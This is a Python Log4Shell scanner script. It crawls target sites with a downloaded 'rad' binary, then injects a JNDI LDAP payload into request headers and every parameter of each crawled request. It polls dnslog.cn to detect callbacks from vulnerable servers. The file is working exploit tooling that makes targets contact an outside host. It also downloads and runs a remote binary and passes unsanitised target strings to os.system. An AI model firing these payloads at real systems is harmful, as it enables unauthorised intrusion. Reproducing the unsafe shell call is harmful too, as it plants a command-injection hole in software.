#!/usr/bin/python3
# coding: utf-8

import subprocess
import requests
import os
import json
import time
import queue
import warnings
import argparse
import platform
import zipfile
import base64

warnings.filterwarnings(action='ignore')
current_os = platform.system().lower()


class ArgumentParse:
    def __init__(self):
        self.args = self.parse()

        self.args.urls = [self.args.url] if self.args.url else []
        if self.args.file:
            with open(self.args.file, 'r', encoding='utf8') as f:
                for url in f.readlines():
                    self.args.urls.append(url.strip())

        # self.args.chrome_path = self.args.chrome_path if self.args.chrome_path else '/usr/bin/chromium-browser'
        if not self.args.payload:
            self.args.dnslog = Dnslog()
            self.args.payload = '${jndi:ldap://' + self.args.dnslog.domain + '/exp}'
        print(f'using {self.args.payload}')

    def parse(self):
        parser = argparse.ArgumentParser(description='')
        parser.add_argument("-u", "--url", dest="url", help="Check a single URL.", action='store', default=None)
        parser.add_argument("-f", "--file", dest="file", help="file containing url.", action='store', default=None)
        parser.add_argument("-c", dest="chrome_path", help="Specify the chrome path.", action='store', default=None)
        parser.add_argument("-p", "--payload", dest="payload", help="Specify the payload like ${jndi:ldap://xx}.",
                            action='store', default=None)
        args = parser.parse_args()
        return args


def download_rad():
    file = 'rad_{os}_amd64.exe'.format(os=current_os)
    url = 'https://download.xray.cool/rad/0.4/rad_{os}_amd64.exe.zip'.format(os=current_os)
    if current_os != 'windows':
        file = file.replace('.exe', '')
        url = url.replace('.exe', '')
    print(file)
    while True:
        if not os.path.exists(file):
            print('Downloading ' + file)
            time.sleep(5)
            r = requests.get(url)
            with open("{}.zip".format(file), "wb") as f:
                f.write(r.content)
            with zipfile.ZipFile('{}.zip'.format(file), 'r') as f:
                f.extractall()
        else:
            break


class Dnslog:
    def __init__(self):
        self.s = requests.session()
        try:
            req = self.s.get("http://www.dnslog.cn/getdomain.php", timeout=30)
            self.domain = req.text
        except requests.exceptions.ConnectionError:
            exit('dnslog ConnectionError. Try using the -p parameter to specify a payload containing other dnslog or ip')

    def pull_logs(self):
        try:
            req = self.s.get("http://www.dnslog.cn/getrecords.php", timeout=30)
            return req.json()
        except requests.exceptions.ConnectionError:
            exit('dnslog ConnectionError. Try using the -p parameter to specify a payload containing other dnslog or ip')


class Log4Scan:
    def __init__(self, args, target):
        self.args = args
        self.queue = queue.Queue()
        self.target = target
        # self.output_file = NamedTemporaryFile(delete=False).name

    def craw(self):
        print('start to craw {}'.format(self.target))
        rad_cmd = 'rad_{os}_amd64.exe'.format(os=current_os) if current_os == 'windows' else './rad_{os}_amd64'.format(os=current_os)
        # cmd = [rad_cmd, "--json-output", "{}.json".format(self.target), '--target', self.target]
        # rsp = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # output = str(rsp.stdout, encoding='utf-8')
        cmd = '{rad_cmd} --json-output {target}.json --target {target}'.format(rad_cmd=rad_cmd, target=self.target)
        status = os.system(cmd)

        if status == 0 and os.path.exists('{domain}.json'.format(domain=self.target)):
            with open('{domain}.json'.format(domain=self.target), 'r', encoding='utf-8') as f:
                lines = f.read()
                data = json.loads(lines)
                for i in data:
                    self.queue.put(i)
        else:
            exit('error')

    def repeat(self):
        while True:
            if not self.queue.empty():
                package = self.queue.get()
                # print(package)
                url = package['URL'].replace('https', 'http')
                method = package['Method']
                headers = package['Header']
                headers['User-Agent'] = self.args.payload
                headers['Referer'] = self.args.payload
                data = package['b64_body'] if 'b64_body' in package.keys() else None

                try:
                    resp = None
                    if method.lower() == 'get':
                        if '=' not in url:
                            continue
                        url = self.insert_payload(url, url=True)
                        url = str(url)
                        resp = requests.get(url=url, headers=headers, timeout=30, verify=False)
                    elif method.lower() == 'post':
                        if not data:
                            continue
                        data = base64.b64decode(data).decode("utf-8")
                        if '=' not in data and ':' not in data:
                            data = self.args.payload
                        else:
                            data = self.insert_payload(data)
                        resp = requests.post(url=url, headers=headers, data=data, timeout=30, verify=False)
                    print(resp.status_code, method, url, data)
                except Exception as e:
                    print(e)
                finally:
                    if hasattr(self.args, 'dnslog'):   # 判断是否使用默认的dnslog
                        if self.queue.qsize() % 10 == 0:       # dnslog请求次数过多会被封
                            dnslog_result = self.args.dnslog.pull_logs()
                            print(dnslog_result)
                            if dnslog_result:
                                print('==='*10)
                                print(f'{self.target} is vulnerable.')
                                exit('The vulnerability exists in the link within the last ten requests')
            else:
                break

    def insert_payload(self, data, url=False):
        try:
            # 替换json格式
            if data.startswith('{') and data.endswith('}') and ':' in data:
                data = json.loads(data)
                for key, value in data.items():
                    data[key] = self.args.payload
                return data

            # 替换字符串形式
            row = ''
            data = dict(i.split('=') for i in data.split('&'))
            for key, value in data.items():
                data[key] = self.args.payload
                if url:
                    row += key + '=' + data[key] + '&'

            if url:
                return row.strip('&')
            return data
        except Exception as e:
            print(e)
            return data


if __name__ == '__main__':
    # if len(sys.argv) <= 1:
    #     print('\n%s -h for help.' % (sys.argv[0]))
    #     exit(0)

    print('''
             _                _  _   _ ____      ____
    | |    ___   __ _| || | (_)___ \    / ___|  ___ __ _ _ __  _ __   ___ _ __
    | |   / _ \ / _` | || |_| | __) |___\___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
    | |__| (_) | (_| |__   _| |/ __/_____|__) | (_| (_| | | | | | | |  __/ |
    |_____\___/ \__, |  |_|_/ |_____|   |____/ \___\__,_|_| |_|_| |_|\___|_|
                |___/     |__/     by jshahjk@163.com. Illegal use is prohibited. 
    ''')

    download_rad()
    arguments = ArgumentParse()
    for url in arguments.args.urls:
        log4j2scan = Log4Scan(arguments.args, url)
        log4j2scan.craw()
        log4j2scan.repeat()
